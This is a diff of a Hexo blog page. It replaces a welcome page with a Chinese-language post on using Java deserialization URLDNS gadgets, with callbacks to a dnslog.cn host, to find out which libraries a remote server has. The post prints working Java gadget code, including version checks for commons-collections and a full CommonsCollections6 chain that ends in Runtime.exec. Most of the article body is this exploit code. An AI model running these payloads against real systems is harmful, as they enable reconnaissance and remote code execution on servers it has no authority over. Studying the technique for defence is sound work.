@@ -20,22 +20,28 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="欢迎来到我的安全杂货铺 一个来自AAA战队的退役老人旧的博客链接https:&#x2F;&#x2F;blog.csdn.net&#x2F;azraelxuemo&#x2F;">
+    <meta name="description" content="有时候我们发现远程有一个反序列化的漏洞，但是我们不知道有什么依赖，如果单纯的盲打反序列化链就要一个个试，如果知道依赖了以后我们也方便本地构造payload 原理普通的dnslog请求payload 123456URL url &#x3D; new URL(&quot;http:&#x2F;&#x2F;aaaa.fnht9d.dnslog.cn&quot;);HashMap hashMap &#x3D; new HashMap();Met">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Welcome">
-<meta property="og:url" content="https://azraelxuemo.github.io/index.html">
+<meta property="og:title" content="dnslog检测远程依赖">
+<meta property="og:url" content="https://azraelxuemo.github.io/2023/12/24/dnslog%E6%A3%80%E6%B5%8B%E8%BF%9C%E7%A8%8B%E4%BE%9D%E8%B5%96/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="欢迎来到我的安全杂货铺 一个来自AAA战队的退役老人旧的博客链接https:&#x2F;&#x2F;blog.csdn.net&#x2F;azraelxuemo&#x2F;">
+<meta property="og:description" content="有时候我们发现远程有一个反序列化的漏洞，但是我们不知道有什么依赖，如果单纯的盲打反序列化链就要一个个试，如果知道依赖了以后我们也方便本地构造payload 原理普通的dnslog请求payload 123456URL url &#x3D; new URL(&quot;http:&#x2F;&#x2F;aaaa.fnht9d.dnslog.cn&quot;);HashMap hashMap &#x3D; new HashMap();Met">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2023-11-11T06:27:39.000Z">
-<meta property="article:modified_time" content="2023-11-15T11:29:19.913Z">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1703304271836-42df89d6-44a2-4363-89c0-1834ae590f6d.png#averageHue=%2326292c&clientId=uc48fc963-9334-4&from=drop&id=u8e207104&originHeight=388&originWidth=1158&originalType=binary&ratio=2&rotation=0&showTitle=false&size=312962&status=done&style=none&taskId=u8e18ae2d-2e07-4619-aa73-79b1076d724&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1703304335687-0d0e3125-b91e-4ab9-8a53-d401a30b55a4.png#averageHue=%23242529&clientId=uc48fc963-9334-4&from=drop&id=u77b3d8b3&originHeight=958&originWidth=1382&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1067150&status=done&style=none&taskId=u4280eb47-cc68-4fdd-a88d-5df37facb17&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1703304409713-0ca65242-f06e-45f3-9fb9-e04f4569db36.png#averageHue=%23e4e8f0&clientId=uc48fc963-9334-4&from=drop&id=u6383115f&originHeight=740&originWidth=1514&originalType=binary&ratio=2&rotation=0&showTitle=false&size=728057&status=done&style=none&taskId=u1fc5c421-0ae9-4cd3-8578-b7f10a15451&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1703305171619-56a6cb4e-0660-4cc8-8811-62cc6eeb5989.png#averageHue=%23232427&clientId=u6e10134a-22bd-4&from=drop&id=u351d76ce&originHeight=856&originWidth=2062&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1248778&status=done&style=none&taskId=ubf7a4bde-dd59-4bd7-8063-b17fc38689d&title=">
+<meta property="article:published_time" content="2023-12-24T02:51:34.000Z">
+<meta property="article:modified_time" content="2023-12-24T02:45:54.955Z">
 <meta property="article:author" content="azraelxuemo">
+<meta property="article:tag" content="java">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1703304271836-42df89d6-44a2-4363-89c0-1834ae590f6d.png#averageHue=%2326292c&clientId=uc48fc963-9334-4&from=drop&id=u8e207104&originHeight=388&originWidth=1158&originalType=binary&ratio=2&rotation=0&showTitle=false&size=312962&status=done&style=none&taskId=u8e18ae2d-2e07-4619-aa73-79b1076d724&title=">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/favicon.ico">
     
-    <title>Welcome · azraelxuemo&#39;s Studio</title>
+    <title>dnslog检测远程依赖 · azraelxuemo&#39;s Studio</title>
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
 - testing support for link[rel=preload]
@@ -261,7 +267,7 @@
                 <a href="/">azraelxuemo&#39;s Studio.</a>
             </div>
             <div class="post-title header-element">
-                <a href="#" class="post-name">Welcome</a>
+                <a href="#" class="post-name">dnslog检测远程依赖</a>
             </div>
         </div>
     
@@ -307,7 +313,7 @@
         <h1 class="intro-title">
             <!-- 主页  -->
             
-                Welcome
+                dnslog检测远程依赖
             <!-- 404 -->
             
         </h1>
@@ -327,6 +333,8 @@
                     <div class= post-intro-tags >
     
     
+        <a class="post-tag" href="javascript:void(0);" data-tags="java">java</a>
+    
 </div>
 
                 
@@ -335,7 +343,7 @@
                 <div class="post-intro-meta">
                     <!-- 撰写日期 -->
                     <span class="iconfont-archer post-intro-calander">&#xe676;</span>
-                    <span class="post-intro-time">2023/11/11</span>
+                    <span class="post-intro-time">2023/12/24</span>
                     <!-- busuanzi -->
                     
                         <span id="busuanzi_container_page_pv" class="busuanzi-pv">
@@ -490,17 +498,32 @@
             <div class="container container-unloaded">
                 <main class="main post-page">
     <article class="article-entry">
-        <p>欢迎来到我的安全杂货铺</p>
-<p>一个来自AAA战队的退役老人<br>旧的博客链接<a target="_blank" rel="noopener" href="https://blog.csdn.net/azraelxuemo/">https://blog.csdn.net/azraelxuemo/</a></p>
+        <p>有时候我们发现远程有一个反序列化的漏洞，但是我们不知道有什么依赖，如果单纯的盲打反序列化链就要一个个试，如果知道依赖了以后我们也方便本地构造payload</p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>普通的dnslog请求payload</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">URL url = new URL(<span class="string">&quot;http://aaaa.fnht9d.dnslog.cn&quot;</span>);</span><br><span class="line">HashMap hashMap = new HashMap();</span><br><span class="line">Method putVal = hashMap.getClass().getDeclaredMethod(<span class="string">&quot;putVal&quot;</span>, new Class[]&#123;<span class="type">int</span>.class, Object.class, Object.class, boolean.class, boolean.class&#125;);</span><br><span class="line">putVal.setAccessible(<span class="literal">true</span>);</span><br><span class="line">putVal.invoke(hashMap,new Object[]&#123;<span class="number">0</span>,url,<span class="string">&quot;a&quot;</span>,<span class="literal">false</span>,<span class="literal">false</span>&#125;);</span><br><span class="line">serialize(hashMap);</span><br></pre></td></tr></table></figure>
+<p>HashMap是个key value得键值对，然后会调用hash(key)来触发dnslog，之前value我们都是随便传的，但是实际上我们可以利用这个value来探测依赖<br>我们这里随便传入一个本地才有的class,demo</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> public <span class="type">static</span> HashMap <span class="title function_">getURLDNSGadget</span><span class="params">(String urls, Class clazz)</span> throws Exception&#123;</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        URL url = new URL(urls);</span><br><span class="line">        Method putVal = hashMap.getClass().getDeclaredMethod(<span class="string">&quot;putVal&quot;</span>, new Class[]&#123;<span class="type">int</span>.class, Object.class, Object.class, boolean.class, boolean.class&#125;);</span><br><span class="line">        putVal.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        putVal.invoke(hashMap,new Object[]&#123;<span class="number">0</span>,url,clazz,<span class="literal">false</span>,<span class="literal">false</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">HashMap test=getURLDNSGadget(<span class="string">&quot;http://testaa.fnht9d.dnslog.cn&quot;</span>,demo.class);</span><br><span class="line">        serialize(test);</span><br></pre></td></tr></table></figure>
+<p>我们可以看到HashMap的readobejct里面，他是先把对应的key value反序列化出来再调用hash这个函数触发dnslog，如果value反序列化失败了，那么就不会有log了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1703304271836-42df89d6-44a2-4363-89c0-1834ae590f6d.png#averageHue=%2326292c&clientId=uc48fc963-9334-4&from=drop&id=u8e207104&originHeight=388&originWidth=1158&originalType=binary&ratio=2&rotation=0&showTitle=false&size=312962&status=done&style=none&taskId=u8e18ae2d-2e07-4619-aa73-79b1076d724&title=" alt="截屏2023-12-23 12.04.27.png"><br>所以这里可以看到远程报错，然后就没有dnslog请求<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1703304335687-0d0e3125-b91e-4ab9-8a53-d401a30b55a4.png#averageHue=%23242529&clientId=uc48fc963-9334-4&from=drop&id=u77b3d8b3&originHeight=958&originWidth=1382&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1067150&status=done&style=none&taskId=u4280eb47-cc68-4fdd-a88d-5df37facb17&title=" alt="截屏2023-12-23 12.05.32.png"><br> 如果传入一个存在的类，比如说jdk里面自带的Map,就可以发现成功获取到dnslog</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HashMap test=getURLDNSGadget(<span class="string">&quot;http://testaa.fnht9d.dnslog.cn&quot;</span>,Map.class);</span><br><span class="line">      serialize(test);</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1703304409713-0ca65242-f06e-45f3-9fb9-e04f4569db36.png#averageHue=%23e4e8f0&clientId=uc48fc963-9334-4&from=drop&id=u6383115f&originHeight=740&originWidth=1514&originalType=binary&ratio=2&rotation=0&showTitle=false&size=728057&status=done&style=none&taskId=u1fc5c421-0ae9-4cd3-8578-b7f10a15451&title=" alt="截屏2023-12-23 12.06.46.png"></p>
+<h1 id="cc链依赖"><a href="#cc链依赖" class="headerlink" title="cc链依赖"></a>cc链依赖</h1><p>以cc6为例</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ConstantTransformer constantTransformer=new ConstantTransformer(Runtime.class);</span><br><span class="line">        InvokerTransformer getMethod = new InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,null&#125;);</span><br><span class="line">        InvokerTransformer invokeMethod = new InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null,null&#125;);</span><br><span class="line">        InvokerTransformer execMethod = new InvokerTransformer(<span class="string">&quot;exec&quot;</span>, new Class[]&#123;String.class&#125;, new Object[]&#123;<span class="string">&quot;code&quot;</span>&#125;);</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;constantTransformer,getMethod,invokeMethod,execMethod&#125;);</span><br><span class="line">        Map lazyMap = LazyMap.decorate(new HashMap(), chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,<span class="string">&quot;b&quot;</span>);</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        Method putVal = hashMap.getClass().getDeclaredMethod(<span class="string">&quot;putVal&quot;</span>, new Class[]&#123;<span class="type">int</span>.class, Object.class, Object.class, boolean.class, boolean.class&#125;);</span><br><span class="line">        putVal.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        putVal.invoke(hashMap,new Object[]&#123;<span class="number">0</span>,tiedMapEntry,<span class="string">&quot;a&quot;</span>,<span class="literal">false</span>,<span class="literal">false</span>&#125;);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        deserialize();</span><br></pre></td></tr></table></figure>
+<p>这里面可以看到有ConstantTransformer  InvokerTransformer ChainedTransformer LazyMap TiedMapEntry   commons-collection3.2.1里面的依赖<br>HashMap jdk的依赖<br>一般我们探测的原则就是非jdk自带的依赖，在这里我们只需要探测是否有commons-collection3.2.1即可</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HashMap test=getURLDNSGadget(<span class="string">&quot;http://testaa.fnht9d.dnslog.cn&quot;</span>,InvokerTransformer.class);</span><br><span class="line">       serialize(test);</span><br></pre></td></tr></table></figure>
+<p>但是我们这样写有一个问题，如果我们本地生成序列化payload的时候有3.2.1 4版本的，很容易分不清到底是哪个版本<br>所以我们调整一下，下面这种写法就可以比较清晰的看到具体的版本依赖了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public <span class="type">static</span> HashMap <span class="title function_">getURLDNSGadget</span><span class="params">(String urls, String clazzName)</span> throws Exception&#123;</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        URL url = new URL(urls);</span><br><span class="line">        Method putVal = hashMap.getClass().getDeclaredMethod(<span class="string">&quot;putVal&quot;</span>, new Class[]&#123;<span class="type">int</span>.class, Object.class, Object.class, boolean.class, boolean.class&#125;);</span><br><span class="line">        putVal.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        putVal.invoke(hashMap,new Object[]&#123;<span class="number">0</span>,url,Class.forName(clazzName),<span class="literal">false</span>,<span class="literal">false</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">HashMap test=getURLDNSGadget(<span class="string">&quot;http://testaa.fnht9d.dnslog.cn&quot;</span>,<span class="string">&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;</span>);</span><br><span class="line">        serialize(test);</span><br></pre></td></tr></table></figure>
+<p>当然细心的朋友可能会问，如果只是类，就无法探测是commons-collection 3.2.1还是commons-collection 3.2.2，那么再调整一下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public <span class="type">static</span> HashMap <span class="title function_">getURLDNSGadget</span><span class="params">(String urls, Object object)</span> throws Exception&#123;</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        URL url = new URL(urls);</span><br><span class="line">        Method putVal = hashMap.getClass().getDeclaredMethod(<span class="string">&quot;putVal&quot;</span>, new Class[]&#123;<span class="type">int</span>.class, Object.class, Object.class, boolean.class, boolean.class&#125;);</span><br><span class="line">        putVal.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        putVal.invoke(hashMap,new Object[]&#123;<span class="number">0</span>,url,object,<span class="literal">false</span>,<span class="literal">false</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">HashMap test=getURLDNSGadget(<span class="string">&quot;http://testaaaaaa.fnht9d.dnslog.cn&quot;</span>,new InvokerTransformer(<span class="string">&quot;a&quot;</span>,null,null));</span><br><span class="line">        serialize(test);</span><br></pre></td></tr></table></figure>
+<p>如果远程是commons-collection.3.2.2以上，就会报错，收不到dnslog请求<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1703305171619-56a6cb4e-0660-4cc8-8811-62cc6eeb5989.png#averageHue=%23232427&clientId=u6e10134a-22bd-4&from=drop&id=u351d76ce&originHeight=856&originWidth=2062&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1248778&status=done&style=none&taskId=ubf7a4bde-dd59-4bd7-8063-b17fc38689d&title=" alt="截屏2023-12-23 12.19.26.png"></p>
 
     </article>
     <!-- license -->
     
         <div class="license-wrapper">
             <p>Author：<a href="https://azraelxuemo.github.io">azraelxuemo</a>
-            <p>Link：<a href="https://azraelxuemo.github.io/index.html">https://azraelxuemo.github.io/index.html</a>
-            <p>Publish date：<a href="https://azraelxuemo.github.io/index.html">November 11th 2023, 2:27:39 pm</a>
-            <p>Update date：<a href="https://azraelxuemo.github.io/index.html">November 15th 2023, 7:29:19 pm</a>
+            <p>Link：<a href="https://azraelxuemo.github.io/2023/12/24/dnslog%E6%A3%80%E6%B5%8B%E8%BF%9C%E7%A8%8B%E4%BE%9D%E8%B5%96/">https://azraelxuemo.github.io/2023/12/24/dnslog%E6%A3%80%E6%B5%8B%E8%BF%9C%E7%A8%8B%E4%BE%9D%E8%B5%96/</a>
+            <p>Publish date：<a href="https://azraelxuemo.github.io/2023/12/24/dnslog%E6%A3%80%E6%B5%8B%E8%BF%9C%E7%A8%8B%E4%BE%9D%E8%B5%96/">December 24th 2023, 10:51:34 am</a>
+            <p>Update date：<a href="https://azraelxuemo.github.io/2023/12/24/dnslog%E6%A3%80%E6%B5%8B%E8%BF%9C%E7%A8%8B%E4%BE%9D%E8%B5%96/">December 24th 2023, 10:45:54 am</a>
             <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -508,13 +531,13 @@
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2023/11/12/BUUCTF%E5%88%B7%E9%A2%98/" title="BUUCTF pwn刷题记录">
-                    <div class="nextTitle">BUUCTF pwn刷题记录</div>
-                </a>
-            
         </li>
         <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2023/12/11/fastjson%E5%BA%8F%E5%88%97%E5%8C%96/" title="fastjson序列化">
+                    <div class="prevTitle">fastjson序列化</div>
+                </a>
             
         </li>
     </ul>
@@ -653,7 +676,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cc%E9%93%BE%E4%BE%9D%E8%B5%96"><span class="toc-number">2.</span> <span class="toc-text">cc链依赖</span></a></li></ol>
             </div>
         
         <!-- sidebar -->
